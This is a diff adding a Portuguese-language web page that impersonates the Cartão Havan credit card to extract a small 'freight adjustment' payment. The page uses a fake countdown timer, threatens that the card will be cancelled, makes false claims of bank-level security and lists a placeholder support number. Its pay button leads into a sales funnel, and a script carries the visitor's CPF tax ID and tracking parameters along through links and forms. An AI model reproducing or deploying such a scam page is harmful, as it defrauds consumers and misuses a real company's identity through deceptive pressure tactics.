@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartão Havan - Ajuste de Frete</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: #1e3a8a;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            background: white;
+            border-radius: 50px;
+            width: 80px;
+            height: 50px;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            color: #1e3a8a;
+            border: 3px solid white;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            color: #e0e7ff;
+            font-size: 14px;
+        }
+
+        .alert-section {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .alert-icon {
+            width: 40px;
+            height: 40px;
+            background: #f59e0b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: white;
+            font-size: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .alert-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #92400e;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .alert-text {
+            color: #92400e;
+            text-align: center;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+
+        .content {
+            padding: 25px 20px;
+        }
+
+        .status-box {
+            background: #e0f2fe;
+            border: 1px solid #0ea5e9;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .status-title {
+            color: #0369a1;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .status-text {
+            color: #075985;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .card-info {
+            background: #f1f5f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #1e3a8a;
+        }
+
+        .error-box {
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .error-title {
+            color: #dc2626;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .error-text {
+            color: #7f1d1d;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .price-highlight {
+            background: #dc2626;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin: 15px 0;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.3);
+        }
+
+        .urgency-timer {
+            background: #1e3a8a;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .timer-text {
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .timer-display {
+            font-size: 20px;
+            font-weight: bold;
+            color: #fbbf24;
+        }
+
+        .payment-section {
+            background: #f0fdf4;
+            border: 2px solid #22c55e;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .payment-title {
+            color: #15803d;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .payment-info {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px solid #d1fae5;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+            color: white;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4);
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.5);
+            text-decoration: none;
+            color: white;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background: transparent;
+            color: #6b7280;
+            padding: 12px;
+            border: 2px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-secondary:hover {
+            border-color: #9ca3af;
+            color: #374151;
+        }
+
+        .guarantee-section {
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .guarantee-text {
+            color: #065f46;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .footer-info {
+            background: #f9fafb;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 380px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .content {
+                padding: 20px 15px;
+            }
+            
+            .payment-section {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">H</div>
+            <h1>CARTÃO HAVAN</h1>
+            <p>Ajuste de Frete Necessário</p>
+        </div>
+
+        <div class="alert-section">
+            <div class="alert-icon">⚠️</div>
+            <div class="alert-title">Ação Necessária</div>
+            <div class="alert-text">
+                Identificamos um erro no cálculo do frete do seu Cartão Havan. 
+                Regularize agora para garantir a entrega.
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="error-box">
+                <div class="error-title">⚠️ Ajuste Necessário no Seu Pedido</div>
+                <div class="card-info">
+                    <strong>Cartão:</strong> Havan Mastercard ✅ Aprovado<br>
+                    <strong>Status:</strong> Preparando para envio<br>
+                    <strong>Prazo:</strong> 7-10 dias úteis
+                </div>
+                <div class="error-text">
+                    <strong>Problema identificado:</strong> Diferença no cálculo do frete. 
+                    Caso não for pago, seu cartão será automaticamente cancelado.
+                </div>
+                <div class="price-highlight">
+                    R$ 31,41
+                </div>
+                <div style="font-size: 12px; color: #7f1d1d;">
+                    Valor adicional de frete
+                </div>
+            </div>
+
+            <div class="urgency-timer">
+                <div class="timer-text">Seu pedido será cancelado em:</div>
+                <div class="timer-display" id="timer">09:47</div>
+            </div>
+
+            <div class="payment-section">
+                <div class="payment-title">💳 Finalizar Pagamento</div>
+                
+                <div class="payment-info">
+                    <strong>Valor a pagar:</strong> R$ 31,41<br>
+                    <strong>Descrição:</strong> Ajuste de Frete - Cartão Havan<br>
+                    <strong>Pagamento:</strong> Seguro e Instantâneo
+                </div>
+
+                <a href="/funil/pos/up6check/" onclick="this.href+=window.location.search" class="btn-primary">
+                    💳 PAGAR AGORA
+                </a>
+            </div>
+
+            <button class="btn-secondary" onclick="cancelOrder()">
+                Cancelar Pedido
+            </button>
+
+            <div class="guarantee-section">
+                <div class="guarantee-text">
+                    🔐 <strong>100% Seguro:</strong> Pagamento processado em ambiente seguro 
+                    com criptografia de nível bancário. Garantia total de segurança.
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-info">
+            <strong>Havan - Cartão de Crédito</strong><br>
+            Atendimento: 0800-123-4567<br>
+            Disponível 24h por dia, 7 dias por semana<br><br>
+            
+            Pagamento seguro. Confirmação automática após processamento.
+        </div>
+    </div>
+
+    <script>
+        // Timer countdown
+        let timeLeft = 587; // 9:47 in seconds
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const display = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            document.getElementById('timer').textContent = display;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                alert('⏰ Tempo esgotado!\n\nSeu pedido foi cancelado automaticamente.\nEntre em contato conosco para reativar.');
+            }
+        }
+
+        setInterval(updateTimer, 1000);
+
+        function cancelOrder() {
+            if (confirm('❌ Tem certeza que deseja cancelar?\n\nSeu Cartão Havan aprovado será cancelado e você perderá todos os benefícios.')) {
+                alert('Pedido cancelado.\n\nObrigado por escolher a Havan.');
+            }
+        }
+
+        // Add some interactive effects
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate alert icon
+            const alertIcon = document.querySelector('.alert-icon');
+            setInterval(() => {
+                alertIcon.style.transform = 'scale(1.1)';
+                setTimeout(() => {
+                    alertIcon.style.transform = 'scale(1)';
+                }, 200);
+            }, 3000);
+        });
+    </script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid') {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
